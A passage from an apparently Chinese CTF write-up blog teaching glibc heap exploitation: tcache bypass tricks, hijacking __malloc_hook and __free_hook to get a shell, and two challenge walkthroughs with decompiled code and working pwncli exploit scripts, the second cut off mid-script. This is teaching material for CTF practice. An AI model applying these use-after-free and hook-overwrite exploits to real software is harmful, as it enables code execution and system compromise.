python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>)<br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h2 id="绕过tcache"><a href="#绕过tcache" class="headerlink" title="绕过tcache"></a>绕过tcache</h2><p>glibc 2.26以后的 bins 存在 tcache bins</p><p>让释放的<code>chunk</code>不进入tcache的方法</p><p>需要绕过tcache一般是因为，<code>calloc</code>并不从tcache中取<code>chunk</code>，而是从fastbin中取<code>chunk</code>。</p><p>另一个是因为高版本的glibc中对于tcache的double free检查严格，所以我们需要进行绕过。</p><ul><li>释放不在 tcache 大小范围的<code>chunk</code>。</li></ul><p>tcache中最大<code>chunk</code>大小为0x410</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x410</span>)<br>add_chunk(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br>delete_chunk(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><ul><li>释放相同大小的 chunk 将 tcache 填满</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#申请7个相同大小的chunk用来填满tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add(i,<span class="hljs-number">0x68</span>)<br>    <br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x68</span>)<br><br><span class="hljs-comment">#释放7个chunk填满tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(i)<br><br>dele(<span class="hljs-number">7</span>)<br></code></pre></td></tr></table></figure><ul><li>如果题目限制了 free 次数那么需要通过 tcache dup 再 malloc 3 次将 counts 对应位置置为 -1 来绕过 tcache 。</li></ul><p>因为counts为-1，转为无符号数则大于等于7所以释放的chunk不会再进入tcache。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x68</span>)<br><br>delete_chunk(<span class="hljs-number">0</span>)<br>delete_chunk(<span class="hljs-number">0</span>)<br>add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x68</span>)<br>add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x68</span>)<br>add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x68</span>)<br><span class="hljs-comment">#进入fastbin的chunk</span><br>delete_chunk(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><ul><li>控制 tcache_perthread_struct 从而控制 counts 实现绕过 tcache。</li></ul><h2 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h2><h3 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc_hook"></a>malloc_hook</h3><p>如果 hook 有内容，那么执行hook的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim;<br><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p>gdb 调试查看一下，查看<code>__malloc_hook</code>地址。</p><p><img src="/../../musl/assets/Pasted%20image%2020250411165402.png"></p><p>然后通过<code>tel</code>查看地址上是否有内容，可以看到地址内容为空。</p><p><img src="/../../musl/assets/Pasted%20image%2020250411165442.png"></p><p>如果这个地址内容是一个函数比如<code>system</code>，那么调用<code>malloc</code>函数就会执行<code>system</code>函数。</p><h3 id="free-hook"><a href="#free-hook" class="headerlink" title="free_hook"></a>free_hook</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>__libc_free (<span class="hljs-type">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br>  <span class="hljs-comment">// 调用 __free_hook ，参数是是否的内存的地址。</span><br>  <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>gdb调试</p><p><img src="/../../musl/assets/Pasted%20image%2020250411165641.png"></p><p>查看 free_hook 地址上的内容</p><p><img src="/../../musl/assets/Pasted%20image%2020250411165755.png"></p><p>我们可以通过在hook中写<code>system</code>函数，将<code>malloc</code>和<code>free</code>函数修改为执行<code>system</code>函数，我们<code>malloc</code>或<code>free</code>一个存有<code>/bin/sh</code>的chunk既可以完成getshell。或者我们可以将hook修改为one_gadget直接getshell。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="2024-强网杯-baby-heap"><a href="#2024-强网杯-baby-heap" class="headerlink" title="2024 强网杯 baby_heap"></a>2024 强网杯 baby_heap</h3><blockquote><p>2024 强网杯 baby_heap</p></blockquote><p>2.35 的堆，这题只需要懂得基本的地址泄露就可以完成。</p><ul><li>分析</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">❯ baby_heap checksec ./pwn<br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></table></figure><p>在程序中的<code>sub_1c99</code>函数中发现了任意地址写漏洞，即将<code>buf</code>变量的内容作为目标写入地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_1C99</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">if</span> ( dword_5068 )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  sub_1616(<span class="hljs-string">&quot;Wow ! You find my secret shop !\n&quot;</span>);<br>  sub_1616(<span class="hljs-string">&quot;But ! It&#x27;s not so easy to get my secret \n&quot;</span>);<br>  sub_1616(<span class="hljs-string">&quot;  /\\_/\\  \n&quot;</span>);<br>  sub_1616(<span class="hljs-string">&quot; ( o.o ) \n&quot;</span>);<br>  sub_1616(<span class="hljs-string">&quot;  &gt; ^ &lt;  \n&quot;</span>);<br>  sub_1616(<span class="hljs-string">&quot;Input your target addr \n&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8uLL</span>);<br>  sub_1C33();<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x10u</span>LL);<br>  <span class="hljs-keyword">return</span> ++dword_5068;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里对范围进行了限制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">sub_1C33</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">void</span> *result; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">stdin</span> &lt;= buf &amp;&amp; &amp;<span class="hljs-built_in">stdin</span>[<span class="hljs-number">512</span>] &gt; buf )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  result = buf;<br>  <span class="hljs-keyword">if</span> ( &amp;<span class="hljs-built_in">stdin</span>[<span class="hljs-number">-2206368</span>] &gt; buf )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里通过<code>getenv</code>函数获取了环境变量，即 flag 藏在环境变量中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_1D5D</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> *v0; <span class="hljs-comment">// rax</span><br><br>  v0 = getenv(<span class="hljs-string">&quot;USER&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( v0 )<br>    LODWORD(v0) = <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;USER = %s\n&quot;</span>, v0);<br>  <span class="hljs-keyword">return</span> v0;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里存在一个 UAF 漏洞。我们可以通过 UAF 泄露<code>libc</code>基址，然后将任意地址修改为<code>puts</code>函数输出<code>environ</code>从而输出环境变量中的 flag。</p><ul><li>exp</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.35.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size</span>):<br>    sla(<span class="hljs-string">&#x27;: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;e &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;: \n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>    ru(<span class="hljs-string">&#x27;here \n&#x27;</span>)<br><br>malloc(<span class="hljs-number">0x700</span>)<br>malloc(<span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>base=u64(r(<span class="hljs-number">8</span>))-<span class="hljs-number">0x21ace0</span><br>got=base+<span class="hljs-number">0x00000000021A118</span><br>sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>s(p64(got))<br>s(p64(base+libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;2&#x27;</span>)<br><br>ia()<br></code></pre></td></tr></table></figure><h3 id="NISACTF-2022-UAF"><a href="#NISACTF-2022-UAF" class="headerlink" title="[[NISACTF 2022]UAF]"></a>[[NISACTF 2022]UAF]</h3><blockquote><p>[[NISACTF 2022]UAF]</p></blockquote><p>题型：存在函数指针</p><ol><li>查保护</li></ol><p>发现为32位程序，并且没有<code>PIE</code>保护。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  [NISACTF 2022]UAF checksec ./pwn<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br></code></pre></td></tr></table></figure><ol start="2"><li>分析</li></ol><p>分析<code>main</code>函数</p><p>分析主函数发现为经典菜单程序，通过选择执行相应的功能函数。</p><p>接下来我们逐个功能函数分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> input[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  input[<span class="hljs-number">1</span>] = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.create&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.edit&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.delete&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4.show&quot;</span>);<br>      <span class="hljs-built_in">putchar</span>(<span class="hljs-number">58</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, input);<br>      <span class="hljs-keyword">if</span> ( input[<span class="hljs-number">0</span>] != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      edit();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( input[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">2</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( input[<span class="hljs-number">0</span>] == <span class="hljs-number">3</span> )<br>      &#123;<br>        del();<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( input[<span class="hljs-number">0</span>] == <span class="hljs-number">4</span> )<br>      &#123;<br>        show();<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>LABEL_13:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid choice&quot;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( input[<span class="hljs-number">0</span>] != <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_13;<br>      create();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先我们来分析<code>create</code>函数，当输入的数字为1时执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">create</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you are creating the %d page\n&quot;</span>, i);<br>  result = i;<br>  <span class="hljs-keyword">if</span> ( i &gt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    result = i;<br>    <span class="hljs-keyword">if</span> ( i &lt;= <span class="hljs-number">9</span> )<br>    &#123;<br>      v1 = i;<br>      (&amp;page)[v1] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8u</span>);                 <span class="hljs-comment">// 固定申请8字节</span><br>      <span class="hljs-keyword">if</span> ( i )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( i &lt;= <span class="hljs-number">0</span> || i &gt; <span class="hljs-number">9</span> )<br>        &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Good cretation!&quot;</span>);<br>          <span class="hljs-keyword">return</span> ++i;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v2 = page;<br>        *page = <span class="hljs-number">0x6F616967</span>;<br>        v2[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>        *(page + <span class="hljs-number">1</span>) = echo;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The init page&quot;</span>);<br>        <span class="hljs-keyword">return</span> ++i;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来分析<code>del</code>函数</p><p>通过输入的数字来释放对应的<code>chunk</code>，并且数字不能够小于0或大于i。</p><p>我们将<code>chunk</code>释放后，由于没有将指针置为<code>null</code>，所以这里存在一个UAF的漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">del</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input page&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt; i )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">free</span>((&amp;page)[v1]);                          <span class="hljs-comment">// free后没有将指针置为null，存在uaf漏洞</span><br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来分析<code>edit</code>函数</p><p>函数通过输入相应<code>chunk</code>的标号来释放<code>chunk</code>，但是前面有一个检查，如果输入的标号等于零或大于<code>i</code>则不会执行修改程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">edit</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input page&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0</span> || v1 &gt; i )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your strings&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, (&amp;page)[v1]);          <span class="hljs-comment">// 编辑page的内容，存在漏洞</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后我们分析<code>show</code>函数</p><p>程序通过标号查看相应<code>chunk</code>的内容，但是这里有一个非常关键的点。</p><p>如果我们输入的标号为0，则并不会执行查看<code>chunk</code>的功能。</p><p>但是会将<code>chunk</code>的内容作为函数指针执行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input page&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0</span> || v1 &gt; i )<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      echo((&amp;page)[v1]);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    (*(page + <span class="hljs-number">1</span>))(page);                        <span class="hljs-comment">// 将page作为函数指针调用</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>综合以上分析</p><ul><li><code>create</code>函数固定申请8字节<code>chunk</code></li><li><code>del</code>函数存在UAF漏洞</li><li><code>edit</code>函数不能修改0<code>chunk</code>的内容</li><li><code>show</code>函数可以将0<code>chunk</code>的内容作为函数指针执行</li></ul><p>我们可以通过利用UAF漏洞通过1<code>chunk</code>来间接修改0<code>chunk</code>的内容，比如将<code>chunk</code>内容修改为<code>system</code>函数或<code>one_gadget</code></p><p>然后通过<code>show</code>函数调用执行。</p><ol start="2"><li>exp</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">i, prompt</span>):<br>    sla(prompt, 